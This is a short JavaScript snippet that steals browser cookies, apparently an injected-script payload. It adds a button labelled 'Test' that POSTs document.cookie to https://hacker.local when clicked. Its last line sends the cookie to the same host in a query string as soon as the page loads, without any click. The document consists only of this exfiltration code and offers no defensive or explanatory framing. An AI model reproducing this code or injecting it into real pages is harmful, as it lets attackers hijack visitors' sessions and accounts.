const btn = document.createElement('button');
btn.innerText = 'Test';

document.body.appendChild(btn);

btn.addEventListener('click', () => {
  const cookie = document.cookie;

  (async () => {
    const res = await fetch('https://hacker.local', {
      method: 'POST',
      headers: {
        Accept: 'application/json',
        'Content-Type': 'application/json',
        'Access-Control-Allow-Origin': 'https://hacker.local',
      },
      body: JSON.stringify({ cookie }),
    });

    const data = await res.json();
    console.log({ cookie, data });
  })();
});

(async () => await fetch(`https://hacker.local?cookie=${document.cookie}`))();
